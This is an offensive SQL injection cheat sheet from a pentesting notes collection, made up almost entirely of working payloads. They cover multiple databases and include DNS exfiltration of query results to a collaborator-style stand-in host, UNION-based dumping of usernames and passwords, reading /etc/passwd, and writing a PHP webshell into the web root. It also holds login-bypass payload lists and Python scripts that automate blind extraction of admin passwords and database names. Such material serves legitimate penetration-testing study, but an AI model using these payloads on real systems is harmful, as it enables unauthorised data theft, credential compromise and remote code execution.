---
title: SQL Injection (SQLi)
category: Web
order: 3
---

SQLi is a common web application vulnerability that is caused by unsanitized user input being inserted into SQL queries.


# Cheat Sheet

## String Concatenation

We can concatenate together multiple strings to make a single strings. It also works to do a subquery

* **Oracle**:
```
'foo'||'bar'
```

* **Microsoft**:
```
'foo'+'bar'
```

* **PostgreSQL**:
```
'foo'||'bar'
'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
```

* **MySQL**:
```
'foo' 'bar'
CONCAT('foo', 'bar')
```

> **Note**: It's important while concatenating to only retrieve one element.
>
> `'||(SELECT '' FROM users WHERE ROWNUM = 1)||'`

## Substring

We can extract a part of a string, from a specified offset with a specified length.

* **Oracle**:
```
SUBSTR('foobar', 4, 2)
```

* **Microsoft**:
```
SUBSTRING('foobar', 4, 2)
```

* **PostgreSQL**:
```
SUBSTRING('foobar', 4, 2)
```

* **MySQL**:
```
SUBSTRING('foobar', 4, 2)
```

## Comments

We can use comment to truncate a query and remove the portion of the original query that follows our input.

* **Oracle**:
```
--comment
```

* **Microsoft**:
```
--comment
/*comment*/
```

* **PostgreSQL**:
```
--comment
/*comment*/
```

* **MySQL**:
```
#comment
-- comment (space included)
/*comment*/
```

## Database Version

* **Oracle**:
```
SELECT banner FROM v$version
SELECT version FROM v$instance
```

* **Microsoft**:
```
SELECT @@version
```

* **PostgreSQL**:
```
SELECT version()
```

* **MySQL**:
```
SELECT @@version
```

## Database Contents

* **Oracle**:
```
SELECT * FROM all_tables
SELECT * FROM all_tab_columns WHERE table_name = 'TABLENAME'
```

* **Microsoft**:
```
SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
```

* **PostgreSQL**:
```
SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
```

* **MySQL**:
```
SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
```

## Conditional Errors

* **Oracle**:
```
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual 
```

* **Microsoft**:
```
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END 
```

* **PostgreSQL**:
```
1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END)
```

* **MySQL**:
```
SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a') 
```

## Stacked Queries

We can use batched or stacked queries to execute multipels queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. This technique is primarily of use in realtion to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error or time delay.

* **Oracle**:
```
Does not support batched queries
```

* **Microsoft**:
```
QUERY 1; QUERY 2
```

* **PostgreSQL**:
```
QUERY 1; QUERY 2
```

* **MySQL**:
```
QUERY 1; QUERY 2
```

## Time Delays

* **Oracle**:
```
dbms_pipe.receive_message(('a'),10)
```

* **Microsoft**:
```
WAITFOR DELAY '0:0:10' 
```

* **PostgreSQL**:
```
SELECT pg_sleep(10)
```

* **MySQL**:
```
SELECT SLEEP(10) 
```

## Conditional Time Delays

* **Oracle**:
```
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
```

* **Microsoft**:
```
IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
```

* **PostgreSQL**:
```
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END 
```

* **MySQL**:
```
SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')
```

## DNS Lookup

We can cause the database to perform a DNS lookup to an external domain.

* **Oracle**: The following technique leverages an XXE vulnerability to trigger a DNS lookup. THe vulnerability has been patched but there are many unpatched Oracle installations in existence.
```
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
```

The following payload works on fully patched oracle database but need elevated privileges.

```
SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN') 
```

* **Microsoft**:
```
exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a' 
```

* **PostgreSQL**:
```
copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN' 
```

* **MySQL**: Only on Windows.
```
LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
SELECT  INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
```

## DNS Lookup with data exfiltration

We can also use DNS lookups to exfiltrate data such as passwords or other fields of a table.

* **Oracle**:
```
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
```

* **Microsoft**:
```
declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')
```

* **PostgreSQL**:
```
create OR replace function f() returns void as $$
declare c text;
declare p text;
begin
SELECT into p (SELECT YOUR-QUERY-HERE);
c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
execute c;
END;
$$ language plpgsql security definer;
SELECT f(); 
```

* **MySQL**: Only on Windows.
```
SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a' 
```


# Automatization with sqlmap

```
# Post
sqlmap -r request.txt -p username

# Get
sqlmap -u "http://example.com/index.php?id=1" -p id

# Crawl
sqlmap -u http://example.com --dbms=mysql --crawl=3
```

> **Note:** `request.txt` is a request saved in BurpSuite.

## Dumping a Table

```
sqlmap -r request.txt -p username -D database_name -T table_name --dump
```

# Union Attack

When an application is vulnerable to SQL injection and the results of the query are returned within the application's responses, the `UNION` keyword can be used to retrieve data from other tables within the database.

MySQL syntax for the example:

```
$sql = "SELECT id, name, text FROM example WHERE id=" . $_GET['id'];
```

## Column Number Enumeration

After detect that the application is vulnerable to SQLi we need to know how many columns are queried. To do that task we are going to use order by to guess the number of columns retrieved. The idea is to increment the number until get an error.

```
/index.php?id=1 order by 1
/index.php?id=1 order by 2
/index.php?id=1 order by 3
/index.php?id=1 order by 4 - ERROR
```

## Finding Columns with a useful data type

Now that we know how many columns are in the table, we can use this information to retrieve information. But we need to before understand where this information will be displayed, so we are going to set parameteres to that fields.

```
/index.php?id=1 union all select NULL, NULL, NULL
```

> **Note**: The reason for using `NULL` as the values returned from the injected `SELECT` query is that the data types in each column must be compatible between the original and the injected queries. `NULL` is convertible to every commonly used data type.

```
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```
If the data type of a column is not compatible with string data, the injected query will cause a database error.

## Extracting Data from Database

Now knowing that the third column is for descriptions, we can put there all information.

```
/index.php?id=1 union all select 1, 2, @@version
/index.php?id=1 union all select 1, 2, user()
/index.php?id=1 union all select 1, 2, schema_name from information_schema.schemata
/index.php?id=1 union all select 1, 2, schema_name from information_schema.schemata where schema_name!='information_schema' and schema_name!='performance_schema' and schema_name!='sys' and schema_name!='mysql'
/index.php?id=1 union all select 1, 2, table_name from information_schema.tables
/index.php?id=1 union all select 1, 2, column_name from information_schema.columns where table_name='users'
/index.php?id=1 union all select 1, username, passwords from users
```

## Read files

Some databases allows us to read or write files in the filesystem.

```
/index.php?id=1 union all select 1, 2, load_file('/etc/passwd')
```
## Retrieving multiple values within a single column

We can also concat multiple values for examples users and passwords and print on a single column.

```
' UNION SELECT username || '~' || password FROM users--
```

The output will be:

```
administrator~s3cure
wiener~peter
carlos~montoya
```
# From SQLi to RCE (PHP)

Since we are allowed to upload files, we can upload a webshell to the web root.

```
/index.php?id=1 union all select 1, 2, "<?php system($_GET['cmd']);?>" into OUTFILE '/var/www/html/backdoor.php'
```

In case of exploiting a **Microsoft SQL Server** check this:

* [SQL Server](../../services/sql-server/)

# Login Bypass

The most classic ones:

```
' or '1'='1
' or 1=1-- -
' or 1=1# 
```

Then others:

```
-'
' '
'&'
'^'
'*'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
"-"
" "
"&"
"^"
"*"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
```

## Knowing the username

When we are aware of some username we can impersonate him with SQLi by introducing the username and commenting the rest of the SQL Query.

```
administrator'-- -
administrator'# 
```

# Error Based SQLi

Use CONVERT or CAST to force an ERROR and see the output of the query on errors logs.

_Example of Microsoft SQL Server:_

```
1', CONVERT(int,SELECT  FROM .)

a',convert(int,(SELECT CURRENT_USER)))--
a',convert(int,(SELECT DB_NAME(0))))--
a',convert(int,(SELECT DB_NAME(1))))--

# SELECT FIRST TABLE
a',convert(int,(SELECT TOP 1 name from DATABASE..sysobjects where xtype='U')))--

# SELECT A N TABLE (OFFSET)
a',convert(int,(SELECT name from DATABASE..sysobjects where xtype='U' ORDER BY name OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY )))--

# SELECT A N COLUMN NAME(OFFSET) of TABLE
a',convert(int,(SELECT name from DATABASE..syscolumns WHERE id = (SELECT id FROM DATABASE..sysobjects WHERE name = 'TABLE') ORDER BY name OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY)))--

# DUMP - repeat it modifyng the OFFSET to retrieve all table entries
a',convert(int,(SELECT username FROM DATABASE..TABLE ORDER BY username OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY)))--
a',convert(int,(SELECT password FROM DATABASE..TABLE ORDER BY password OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY)))--
```
_Example of MySQL:_

```
AND updatexml(rand(),concat(CHAR(126),version(),CHAR(126)),null)-- -)
AND updatexml(rand(),concat(CHAR(126),user(),CHAR(126)),null)-- -)
```

# Blind SQLi

A SQLi is blind because we don't have access to the error log or any type of output which difficult a lot the process of exploitation.

## Triggering Conditional Responses

We are going to try to distinct the application response to a `TRUE` and `FALSE` query.

```
xyz' AND '1'='1
xyz' AND '1'='2
```
If we can get the difference of these two queries we can use substring to retrieve data.

But first we need to know the lenght of the data to retrieve.

```
xyz' AND LENGTH((SELECT password FROM users WHERE username='admin')) > 5 -- -
xyz' AND LENGTH((SELECT password FROM users WHERE username='admin')) = 15 -- -
```

```
xyz' AND SUBSTRING((SELECT password FROM USERS WHERE username='admin'), 1, 1) >'m
xyz' AND SUBSTRING((SELECT password FROM USERS WHERE username='admin'), 1, 1) ='s
```

The following is a python example script to automate the data retrieval of a alphanumerical 20 characters length password.

```python
import requests

results = ""
letters = '1234567890zxcvbnmasdfghjklqwertyuiopZXCVBNMASDFGHJKLQWERTYUIOP'
headers = {
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36", 
		"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8", 
		"Sec-Fetch-Site": "same-origin", 
		"Sec-Fetch-Dest": "document", 
		"Accept-Encoding": "gzip, deflate", "Connection": "close"
	}

for i in range(20):
	print("[!] Character %s" % str(i+1) )
	for l in letters:
		payload = "' AND SUBSTRING((SELECT username FROM users WHERE username='administrator'), %s,1) = '%s" % (str(i+1), l)
		cookies = {
			"TrackingId": "Xv2KlSXeuXAWb9NQ" + payload, 
			"session": "iuxOBNDd4wHkhbbOiUVlQBHTv9AchuTu"
		}
		r = requests.get("https://example.com/sqli", headers=headers, cookies=cookies)
		if "Welcome back!" in r.text:
			print("  [+] Character Found: %s" % l)
			results += l
			break;

print("[!] Finished")
print("[+] Final results:")
print(results)
```

Another example of retrieving databases names:

```python
import requests

session = requests.Session()
letters = 'rotasdfghjklzxcvbnmqweyuip_@ZXCVBNMASDFGHJKLQWERTYUIOP=+\'", 0123456789.-$%&*!'


# GET LENGTH OF PAYLOAD:
# Payload: (SELECT table_name from information_schema.tables LIMIT 1 OFFSET 1)
def get_length(payload):
	for i in range(1,100):
		#print("	[!] Length: %s" % i)
		paramsGet = {"contextid":"189112","filename":"17042023164857_test.pdf' AND LENGTH(%s)=%s-- -" % (payload,i)}
		headers = {"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0","Connection":"close","Sec-Fetch-Dest":"document","Sec-Fetch-Site":"none","Sec-Fetch-User":"?1","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate, br","Sec-Fetch-Mode":"navigate"}
		cookies = {"MoodleSession":"otdcni86r8k5u520fcfh5ump30"}
		response = session.get("https://example.com/certificates/download.php", params=paramsGet, headers=headers, cookies=cookies)
		if response.status_code == 200:
			#print("\t[+]--- Length FOUND : %s" % str(i))
			return i
# GET TABLENAME
# Payload: (SELECT table_name from information_schema.tables LIMIT 1 OFFSET 1)
# Length: 14
def get_value(payload, length):
	out = ''
	for i in range(1,length+1):
		for l in letters:
			paramsGet = {"contextid":"189112","filename":"17042023164857_test.pdf' AND SUBSTRING(%s,%s,1)='%s'-- -" % (payload,i,l)}
			headers = {"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0","Connection":"close","Sec-Fetch-Dest":"document","Sec-Fetch-Site":"none","Sec-Fetch-User":"?1","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate, br","Sec-Fetch-Mode":"navigate"}
			cookies = {"MoodleSession":"otdcni86r8k5u520fcfh5ump30"}
			response = session.get("https://example.com/certificates/download.php", params=paramsGet, headers=headers, cookies=cookies)
			if response.status_code == 200:
				print("\t[+] Letter FOUND : %s" % str(l))
				out+=l
				break
	return out


# GET FIRST 10 DATABASES
for i in range(0,10):
	print("[!] DATABASE %s" % i)
	payload = "(SELECT schema_name from information_schema.schemata WHERE schema_name!='information_schema' AND schema_name!='performance_schema' AND schema_name!='sys' AND schema_name!='mysql' LIMIT 1 OFFSET %s)" % str(i)
	
	length = get_length(payload)
	print("\t[+] DATABASE %s LENGTH: %s" %(i, length))

	value = get_value(payload, length)
	print("\t[+] DATABASE %s VALUE: %s" %(i, value))
```

## Conditional Responses by triggering SQL errors

If injecting different boolean conditions makes no difference to the application's response we can force an error using the `1/0`.

_Example of a OracleDB query:_

```
xyz' || (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END) ||'a
xyz' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END) ||'a
```
If we can get the difference of these two queries we can use substring to retrieve data.

```
xyz' || (SELECT CASE WHEN (LENGTH(password) > 5) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator') ||'a
xyz' || (SELECT CASE WHEN (LENGTH(password) = 15) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator') ||'a
```

```
xyz' || (SELECT CASE WHEN (SUBSTR(password, 1, 1) > 'm') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator') ||'a
xyz' || (SELECT CASE WHEN (SUBSTR(password, 1, 1) = 's') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator') ||'a
```


## Time Based

Since we are not aware about any type of error or output we can use sleeps.

```
'; IF (1=2) WAITFOR DELAY '0:0:10'-- -
'; IF (1=1) WAITFOR DELAY '0:0:10'-- -
```

If it loads for four seconds extra we know that the database is processing our `sleep()` command.

### Dump tables

It can also be done with sqlmap or manually with a custom script. In that case the script is dumping MD5 hashes from password field.

```
import requests
chars = "0123456789abcdef"
def GetSQL(i,c):
    return "admin' and substr(password,%s,1) = '%s' -- -" % (i,c)
for i in range(1,33):
    for c in chars:
        injection = GetSQL(i,c)
        payload = {'username':injection,'password':"randompassword"}
        r = requests.post('http://10.10.10.73/login.php',data=payload)
        if 'Wrong identification' in r.text:
            print(c,end='',flush=True)
            break
print()
```

> **Note:** MD5 hash are hexadecimal with 33 character length.

* [https://github.com/codingo/OSCP-2/blob/master/Documents/SQL%20Injection%20Cheatsheet.md](https://github.com/codingo/OSCP-2/blob/master/Documents/SQL%20Injection%20Cheatsheet.md)

# References

* [https://portswigger.net/web-security/sql-injection/union-attacks](https://portswigger.net/web-security/sql-injection/union-attacks)
* [https://sushant747.gitbooks.io/total-oscp-guide/content/sql-injections.html](https://sushant747.gitbooks.io/total-oscp-guide/content/sql-injections.html)
* [https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)